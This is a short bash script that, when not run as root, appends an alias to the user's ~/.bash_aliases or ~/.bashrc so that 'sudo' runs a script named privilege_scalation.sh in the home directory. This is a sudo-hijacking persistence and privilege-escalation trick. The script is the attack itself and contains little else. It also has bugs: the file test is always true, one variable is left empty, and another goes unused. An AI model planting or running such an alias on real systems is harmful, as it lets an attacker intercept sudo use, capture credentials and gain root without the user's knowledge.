#!/bin/bash

username=$(whoami)

script_to_run=""

if [ $username == "root" ]
then
	exit 0
else
	file_path="$(find /home/$USER/ -name .bash_aliases)"
	if [ file_path ]
	then

		echo "alias sudo='/home/$USER/privilege_scalation.sh'" >> ~/.bash_aliases
	else
		file2_path="$(find ~ -name .bashrc)"
		echo "alias sudo='/home/$USER/${script_to_run}'" >> ~/.bashrc
	fi


fi
